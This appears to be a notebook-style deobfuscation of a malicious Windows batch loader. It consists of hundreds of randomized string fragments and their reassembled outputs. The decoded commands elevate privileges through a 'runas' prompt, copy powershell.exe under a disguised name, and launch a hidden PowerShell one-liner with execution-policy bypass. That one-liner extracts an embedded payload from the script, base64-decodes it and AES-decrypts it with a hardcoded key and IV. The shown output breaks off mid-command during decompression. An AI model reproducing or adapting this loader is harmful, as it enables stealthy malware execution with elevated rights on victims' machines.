# %%
CjhfiUztjJ="ileP"
eZLqvcziaM="gume"
usThYuXLdX="exit"
ZkdfdmaNgw="ot %errorlevel%"
wNtVqMqCFg="wers"
PFPfDxbMzj="bypa"
GPQNFBjqgi="cd /"
bKVwefFpfQ="ntLi"
TVAcDBdNlh="ile "
cEanUwXIQf="if n"
fIzceWuXKM="s & "
KIXEgzsDVF=" -Ar"
ZjzFfUOCev="comm"
zqobtKrEvY="Star"
BEUzRjjltF=")"
CJPfaXxzJf="prof"
qwERasRokD="'%0'"
HepXLrKnvX="' -V"
YRzgMdXKMz=" -no"
Kkqwpnfvzf="and "
UcyeCSPgsW="runa"
hVvPwaHkCP="ath "
SInyCaNBAa="erb "
YVYwMJVxmv="s -F"
LRuZSjxfiK="==0 "
JzIdzDtUaD="oces"
NKrqRdqxCl="ss -"
uIVnbEnnim="-ep "
hRSzhljavK="hell"
MvqIdFGluS=" /b "
sWnssDJrYa="( po"
VecujJsRZz="d %1"
cljFYzXQJX="st '%cd%"
nQKWmGfkZJ="t-Pr"

# %%

# Out:
# "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )"

# %%
GPQNFBjqgi+VecujJsRZz
# Out:
# 'cd /d %1'

# %%
PATyweMocs = "do"
eVpNFQBQDl = "nd"
hULGamwFoM = "co"
BWGXyurnmg = "\\v"
mIsJGNkkRn = "1."
CPCBmZCrbB = "ll"
UakecxRebB = ".e"
OqZaUZtyop = "in"
KoTvskfsyp = "ow"
KlILOyOVLH = "Sy"
kYdeEnxiDu = "xe"
AlJuqVPqiH = "he"
QqsVdOChLT = " C"
PYedyUCXMB = "Po"
ABhSbrTgER = "0\\"
byKscheqza = "Wi"
VsXJzQvPaC = "he"
PqScBYMZlf = "po"
GKUDRMEpaS = "st"
gvHRRsHTEc = "rS"
ueIryiAyOC = ":\\"
zhDUqUwSVz = "we"
vjHRISJJjY = "\\W"
oNJWxddbDN = "py"
PrzNbaOOWg = "rs"
gwIgwSeaBE = "ws"
kCXGAzGiGT = "32"
bAmPlzaFrS = "y "
egKnzEtMZI = " /"
akYMOsYnBg = "ll"
CEnbLsFZSW = "s\\"
bLSkxzIocm = "em"
fhUreVqiuD = "we"
XYRIWofhaF = "cd"
zFEmSGAvVk = " %~dp0"
PCUNAlwyyN = ")))"
FIfzngtwnr = " '')"
SivuhbaEYP = "V = "
kngueuhxOS = "q = "
llATVaFqDk = "Conv"
vNtpPlqJRa = "qphQ"
mfPgRyivYW = "ddin"
OzRDrAWMQZ = "-joi"
qmhjzqybHa = "in $"
RjYWbBjiJv = "oL'["
XxARsGbHRS = ")($V"
SiVfyzoQBi = "ose("
xCOmWxCpZW = ");$i"
pAGsDtRpwh = "bvqO"
pTVwXIdjQW = "Syst"
uRHXktqHpL = "j7Q3"
kenRbnaDUk = "[IO."
tRYWKEEyaD = ".Sec"
JRJVmgjFRV = "IO.F"
vWbngtNHbM = ".Key"
GqROtqxuqI = "ke($"
HuVzreexxF = "l.Su"
yoVYlWVCiP = " = $"
afjOzRjDnI = ", $V"
fxAMcxnHqd = "yste"
IpNgGNPBXv = "ecry"
NeFQamqJct = "n ''"
dmwwglsEzU = "w = "
psMZqVzubs = ".Ass"
HOWpeTYmYC = "oryS"
IKikeEPKbw = "lit("
etQcZuKmyN = "=');"
XCFJUORbVx = "VGGC"
bUGEgUQYXJ = "m.IO"
rZTDJpGAXI = ");$h"
qKAPziFwtp = "CaPq"
WYRsmsNyKd = "aeR'"
rxWjAhJeCc = "'')("
HBzagEsWLP = "MjJe"
KjpQtXNlgm = ");$u"
IfXMvVQblJ = "::De"
SUSurGggUs = "k; }"
THLkCeMFOP = "trea"
iMmdcXmeOV = "eaqc"
rkJjOAkPbE = "();$"
MZDEFvsnMj = "]::("
qUNiMnCYAr = "7;$h"
XpQoenbWBs = "$VGG"
hcnXVafHGf = "sion"
pfKETgAtxl = " [st"
IliqejNtaG = "-4] "
OmTqcREaXk = "]::N"
mZePQLGZjw = "yle "
wVxkoIQOyO = "urit"
pkrTczeVdP = "Star"
iXLvyKzBtD = "($Vt"
kntVvxExYh = "6esa"
bhSpiBQTgK = "[]] "
goPbqCDqmt = "[Sys"
DvvURCtIoF = "ode]"
MmcfhfOAMs = "kTUC"
tiJcwPRIOJ = "$YVj"
oSneAUXSSh = "rofi"
TpPlrXPUoY = "[-1."
AEGfPCrqyO = "ose("
pQxrNkwJhp = "[-1."
OewTAiGwwK = "gMod"
YzYqzerXgw = "MjJe"
wrFqbNykZP = "ect "
ATPSKtJvTi = "jlv."
JnsHhvSuDn = "3); "
HteFlsPKgZ = "pres"
OWYHGQasiw = "tem."
YPOYkTBbAY = "] -j"
mhmFryfBwU = ".Cop"
zqPrBUeOVW = "uwka"
pUjtbYiVpo = "();$"
IxtUaQTuuU = "raph"
zLuJzGZtvG = "($Vt"
vZIbzTgZqO = "ring"
dLXChMDheV = "ionM"
JtobwOyTrh = "stem"
AzaeVLnSKm = "tem."
SdqGIqYZlK = "FZWS"
JCwQYyPqiQ = ".Com"
qUXUrmlGco = "'[-1"
ouJPaHImJa = ".Dis"
lSujBoRNiA = "hidd"
PGojXOvYqB = "CQ ="
NMJzzITYFf = "Syst"
tFcYggdmmL = "nd $"
OTiclhgSuM = "ddin"
rOUVFDQwgo = "Sw ="
kFrobVtTmT = "('E5"
hmbEshvCUg = "('%*'"
kyDtsUXGLw = "ispo"
TnShwUQJck = "morF"
IPIYTYFSsY = ":: '"
CgjLTCAhEv = "oin "
nAPQkynwdG = "Comp"
nXLyOHsZla = "('da"
AiKHpVuHKm = "5hmI"
OhTMDxDpGB = "gnir"
WWNxJPWVYA = ";$iF"
cPevnUWtSS = " New"
ivAdHxMcVv = "6] -"
jaLLlcpuvq = "$hbv"
GZJDreBRax = "'wYP"
yXTjVmUoFm = "am;$"
LcUqAWumFV = "YVjl"
nkSaxjbfnJ = "tryP"
iFotAqhIPo = "s -c"
RPPfVYEOBk = "oBl."
QfCqDIrXgO = ".Len"
QOTUrlbpWh = " = $"
aqEygMCsht = "stem"
LAWBSYAhJl = "Stre"
vUBpKkqyJm = ".Mod"
OnNDvRqerT = "Comp"
XYDGzNJYSU = "esMa"
ksSGyiccTF = "aq.D"
XsfXsMiyLF = "qO.I"
tuSEkoDjrJ = "ypas"
AGhPrBoWKq = "[Env"
PzTgWiSDvc = "th('"
WQyaUazOiy = "hbvq"
XhnzUvvTvB = "ne);"
egRYBGozVX = "eam("
STBYmStRjd = "gth)"
MvBGHugepT = "y.Ci"
hqdlljQshA = "::('"
XmGvDSPWBP = "n ''"
CflouPSIiw = "ment"
FDyEkPUkrz = ")) {"
WZLjBdVTff = "'')("
mmvwypOTJG = "d;$h"
wbzdjHhxOv = "lBlo"
AVRwaCHxXU = "en -"
FFubWFHHwC = "iron"
DluwAwkRVl = "pose"
WEJShtliFD = ".Cry"
rVKfPlVlKk = "ep b"
tHlhuLFQnm = "agKi"
PIzhkyoqVz = " = N"
gQBxzrLgMn = "tem."
JGNoCsMdZe = "fore"
jzAnPaYnCw = "();$"
BmWAAtoZtA = "16] "
HEFmnVtMIe = "ateD"
UdYGRKjNtz = "O.Me"
pICjdmzrRC = "F'[-"
FcWRXTvQjv = "GGCQ"
DXkpYciLMH = "1..-"
DrxExOTxWf = "bvqO"
rYSaznuXdP = "y.Pa"
RnfSuHfBUt = "Q, 0"
JuJnoBreWE = "Obje"
iDcekpEUPj = "txeT"
PZlARmasPR = "Bmor"
aCkWUTDwPk = "VGGC"
GurPRNFWbo = "PKCS"
aokxLffLvH = "$iJF"
GbWAhixrGF = "VGGC"
KdwZcjjXfp = "$VGG"
cMTCEkLKSS = "] -j"
XTHXnrRzPc = "ay()"
sfVCsjDOBn = "lv, "
hBggSuTAct = "em.C"
smbYGJxOrp = "orF'"
CBDAOBTbyT = "BC;$"
LrjPMfzbzh = "rity"
GEjfgYPPBb = ".Cry"
WhKVwdRDvc = "ress"
szAlNcSvdx = "rtS4"
DpXgcFEpEf = "rity"
kTbaGJzMtl = "t Sy"
YHVusjrtql = "IeW2"
KaGbwuJUyt = "-1.."
ZpkwRSWgsv = "Secu"
xrwYfdqlwI = "comp"
HWXKkUPEHw = "= $h"
uUaZPjTmTa = "JFSw"
tsHsHobnKO = "w) {"
zObWFbEpqa = ":('g"
czFmiBKjRi = "-joi"
fvuHoEUOnP = "]::C"
MWUegEyBmL = "-nop"
tYyrFOgeyF = "llAd"
fSULLwiEcv = "pose"
DSZmMyFEsf = "$CfO"
iaXIpRBBnV = "oin "
kabAWZtbbw = "wind"
DRQxQsDOCj = "OAS "
NGBTXZEkAw = "vert"
riTkiApaQB = "oW8U"
wshRBSuYJM = "ZWS."
yWezGEFrpR = ");$i"
iZtkXOTvaZ = "New-"
NboPFZpCqQ = "ing("
ZaHzvXRFlW = "Q = "
rGyMvPTwuT = "HRY4"
nZeJHZzoeV = "Fina"
OBgHWjFRum = "; };"
eicofqiouq = "omma"
vMtdCKFcvW = "mory"
dJmyrtUeqc = "ypto"
kjhLfgwfqb = "bvqO"
lorhSAcyfN = ".-16"
DAysEPJMyz = "-Obj"
PqxiwuKEaX = "Obje"
FGLLskrNAo = "HIs "
CpbqGCWJyV = "Sw);"
lfAYHJjktL = ", (,"
HXAsjMGdPV = "bvqO"
jZXsZnbGEi = "yTo("
tbVFNwGmTX = "tsWi"
dhErvhUcWt = "pher"
tSBwRCaKOD = ".GZi"
OzNsEKJeWj = "ile]"
egGOGJBDLg = "[Sys"
SmOlcXEDvk = "$uwk"
BRPfxdubya = "ew-O"
icufEdVtDD = "Sw.T"
hYtTYZswUb = "owst"
QhmKwYkpFs = "ress"
YBkjRZdFxh = "qHyV"
WOUsPLjLWE = "hy.A"
xYyCIDyZmj = "bstr"
FtdLQlshwV = "==')"
CtfEtfqbKZ = "CQ);"
GcnempLkRh = "e]::"
ZwvUkIGTtR = "ptog"
vlebgGbtSL = "bjec"
YyfnMLHqFy = "eaqc"
cMWZwvyPjN = ";$Wt"
JdiCCqVNBs = "[Sys"
xAMQhJmBOx = "rt]:"
NVLCxrCjOR = "rans"
RvXseshryv = "::('"
pNUwTeKlsN = "..-1"
SrwTZyTvDK = ";$Cf"
MbmmdkNtTe = ".Mem"
HXyzvIPatO = "pStr"
lwDAAnUYaB = "yste"
qdbFCEBbwr = ");$h"
HyRyHQpBqP = "em.I"
ncXmYTCjsd = "m(, "
AaSnbDWVNC = "'%~f0'"
NLxvJDWSyV = "nage"
pjPmuoWuNn = "g = "
VPwwoLIKsL = "yste"
cKvGHTjDvb = "ert]"
AmwyQLBXEf = "Disp"
UXsFKnavJJ = "cJs6"
SePljZcNFz = "Secu"
CKviuLofrZ = " = ["
jSZZOHMWdR = "O.Pa"
HNYmvxNiUB = "raph"
rrUEvPqkWT = "  $B"
eaMQOeTuky = "grap"
doFipcMbJK = ")($B"
YIIramEkji = " if "
hLkMSkxvSy = ";$YV"
qBGiegKVIq = "'gni"
dmZgVbtblN = "WtHI"
aeYBWrDapi = "flec"
WwQBwYuwsn = "ck($"
WBVuymYwOO = "wkaq"
bWuTzORYXG = "y/0e"
cYlGmAGehm = "m.IO"
ZusmLHMCrh = "join"
KEkrqPduwc = "tS46"
cKMZbqsBMw = "ptor"
abXWCidkkf = "tion"
OrmbsKChij = "e = "
ZLVNxilofq = "Mode"
dpPDluddlQ = "IQx1"
nTpxHxXyks = "ajzT"
ZXRYTSkiqv = "Disp"
wibEDhnXJi = ".Con"
AVXNOWCrYy = "onve"
yiFdQERKqk = "$iJF"
FnOmSPrnVA = ";$Cf"
EIInafGGUu = "y.Cr"
hERqKpkJoh = "brea"
ePcoAupSbC = "bvqO"
ULmNakQzfB = "ct S"
LLMaabMggA = "vfAA"
AaqVUJsFhc = "le -"
rsiJpdpThO = "se()"
njawpBLQeT = "ress"
aGJlSTmIGr = "ach "
cYlaqThezL = "ct S"
wLFwBdUEap = "oBl "
oElquaruFG = "ptog"
gCZhHGPpYj = "S46e"
ZnNCeXzRlt = "Invo"
SOcYzRPWLD = "nirt"
OQidHljdKW = "GGCQ"
BJwIuQohOC = "esaB"
ySVORBaoos = "Q = "
aofwGrYKuk = ".Dis"
yMQpMYFDTn = ").Sp"
YQplKEDMpD = "[Sys"
JUJSAWmomL = "y]::"
JISCIcqgoz = "ewLi"
aJsZZKACuq = "s.En"
DZAtvAAPfh = "AS.T"
pLzlyFxjtA = " [Sy"
hrMETLTahN = "saBm"
JFEebhCYkv = "form"
nUwdpFcOBu = "tem."
mghNmqVsYW = "null"
iqDvXOCFVy = ".Cre"
kbdibySkhq = "New-"
fPpNQjSMFw = ".-11"
JdjAOFejKG = "oint"
dAXIMoUSbi = "ion."
YklOUriWEd = "m.Re"
gySOngycEi = "embl"
ZQXxXwZuCz = "oArr"
VprwOefjRg = "v = "
fKiWJovwSn = "= [S"
pefkLLoGXd = "$iJF"
oIlWKqUeDe = "VtoB"
morzCVCSlR = "OAS."

# %%
"%~dp0%~nx0.exe"
# Out:
# 'copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y %~dp0%~nx0.exe'

# %%
XYRIWofhaF+zFEmSGAvVk
# Out:
# 'cd %~dp0'

# %%
...
# Out:
# "-noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(':: ')) {  $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=');$hbvqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA==');$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compressio
# ...
